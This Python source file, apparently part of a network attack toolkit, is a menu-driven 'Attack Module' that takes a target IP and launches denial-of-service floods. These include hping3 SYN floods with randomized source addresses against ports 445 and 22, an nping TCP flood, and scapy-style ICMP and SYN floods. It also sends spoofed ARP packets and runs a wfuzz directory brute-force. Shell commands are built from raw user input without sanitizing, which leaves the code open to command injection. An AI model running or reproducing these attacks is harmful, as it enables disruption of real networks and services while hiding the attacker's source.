#!/usr/bin/python

### Attack Module ###

from Libraries import *
from time import gmtime, strftime

Attack_Type=["dos","arpspoof","icmpflood","synflood","tcpflood","fuzzer","sshoverload"]
current_time = strftime("%Y-%m-%d", gmtime())


def Attack_Module(attack_type):
    for order in range(0, len(Attack_Type)):
        if (Attack_Type[order] == attack_type):
            globals()[str(Attack_Type[order])]()

def DestinationIP():
    dstIP = raw_input("Destination IP: ")
    if dstIP == '':
        dstIP = DestinationIP()
    dstIP = HostControl(dstIP)
    return dstIP

def HostControl(host_IP):
    try:
        val = int(host_IP)
    except ValueError:
        return host_IP

    control_3 = host_IP.split("/")
    control = host_IP.split(".")
    control_1 = " "
    control_2 = " "

    if (len(control_3) == 2):
        for loop0 in range(0, 1):
            control_1 = host_IP.split("/")[len(control_3) - (loop0 + 1)]
            if (int(control_1) > 32):
                print("[ERROR] Subnetting has gone wrong !!!")
                time.sleep(1)
                sys.exit()
        for loop in range(0, 4):
            control_2 = host_IP.split(".")[len(control) - (loop + 1)]
            if (len(control_2) > 3):
                control_2 = control_2.split()[0][0]
            if (int(control_2) > 255):
                print("[ERROR] Host IP should be smaller than 256 !!!")
                time.sleep(1)
                sys.exit()

    if (len(control_3) == 1):
        for loop1 in range(0, 4):
            control_2 = host_IP.split(".")[len(control) - (loop1 + 1)]
            if (int(control_2) > 255):
                print("[ERROR] Host IP should be smaller than 256 !!!" )
                time.sleep(1)
                sys.exit()
    return host_IP

def PortControl(host_Port):
    try:
        val = int(host_Port)
    except ValueError:
        print "[ERROR] Please enter a port number!"
        sys.exit()
    return host_Port

def URL_Control(URL):
    extension_List = [ "com","net","org","int","edu","gov","mil","arpa","co","tr","info","cc","io","me","tv","bank","club","site","xyz","com.tr","website","online","biz","tech","top","gen.tr","web.tr","ist","tc","de","mobi","pol.tr","k12.tr","org.tr","bel.tr","name","asia","info.tr","dr.tr","cn.com"]
    URL_p = URL.split(".")[1]
    try:
        val = int(URL_p)
        URL = HostControl(URL)
        return URL
    except ValueError:
        URL_s = URL.split(".")
        URL_s = URL.split(".")[len(URL_s)-1]
        for ext in extension_List:
            if (ext == str(URL_s)):
                return URL
        print("[ERROR] URL Extension Error !!!")

def dos():
    target = DestinationIP()
    os.system("hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source "+target)

def tcpflood():
    target = DestinationIP()
    os.system("nping --tcp-connect -- -rate=90000 -c 900000 -q "+target)

def arpspoof():
    target = DestinationIP()
    cycle = raw_input("How many packets do you send [Press enter for 100]: ")
    if cycle == "":
        cycle = 100
    else:
        try:
            val = int(cycle)
        except:
            print "\n[ERROR] Please, enter a number !"
            arpspoof()

    for x in range (0,int(cycle)):
        ip_obj = ip_("auto", "attack")
        arp_obj = arp_("auto", "attack")
	randIP = RandomIP()

        ip_obj.IP_Packet.dst = target
	ip_obj.IP_Packet.src = randIP
	arp_obj.ARP_Packet.pdst = target
        arp_obj.ARP_Packet.psrc = randIP
        arp_obj.ARP_Packet.hwsrc = RandomMAC()

        send_Packet(ip_obj.IP_Packet,"attack")
        send_Packet(arp_obj.ARP_Packet,"attack")

def icmpflood():
    target = DestinationIP()
    cycle = raw_input("How many packets do you send [Press enter for 100]: ")
    if cycle == "":
        cycle = 100
    else:
        try:
            val = int(cycle)
        except:
            print "\n[ERROR] Please, enter a number !"
            icmpflood()

    for x in range (0,int(cycle)):
        icmp_obj = icmp_("auto","attack")
        send(IP(dst=target)/(icmp_obj.ICMP_Packet))

def synflood():
    target = DestinationIP()
    targetPort = DestinationPort()
    cycle = raw_input("How many packets do you send [Press enter for 100]: ")
    if cycle == "":
        cycle = 100
    else:
        try:
            val = int(cycle)
        except:
            print "\n[ERROR] Please, enter a number !"
            synflood()

    for x in range(0, int(cycle)):
        tcp_obj = tcp_("auto", "attack")
        tcp_obj.TCP_Packet.dport = targetPort
        send(IP(dst=target)/tcp_obj.TCP_Packet)

def fuzzer():
    site = raw_input("Enter the URL: ")
    site = URL_Control(site)
    url = " http://" + site + "/FUZZ"
    if not os.path.exists(desktop+"Fuzz-"+current_time):
        os.system("mkdir "+ desktop +"Fuzz-"+current_time)
    try:
        os.system("wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404" + url + " >" + desktop + "Fuzz-" + current_time + "/" + site + "-WFuzz.txt")
    except:
        print("[ERROR] Please, install wfuzz in your system!")
        os.system("rm -rf " + desktop + "Fuzz-*")

    bad_words = ['[31m404']
    with open(desktop + "Fuzz-" + current_time + "/" + site + "-WFuzz.txt") as oldfile, open(desktop + "Fuzz-" + current_time + "/" + site + "-Fuzz.txt", 'w') as newfile:
        for line in oldfile:
            if not any(bad_word in line for bad_word in bad_words):
                newfile.write(line)
    os.system("rm "+desktop + "Fuzz-" + current_time + "/" + site + "-WFuzz.txt")

def sshoverload():
    target = DestinationIP()
    os.system('hping3 -V -c 1000000 -d 120 -S -w 64 -p 22 -s 445 --flood --rand-source ' + target)
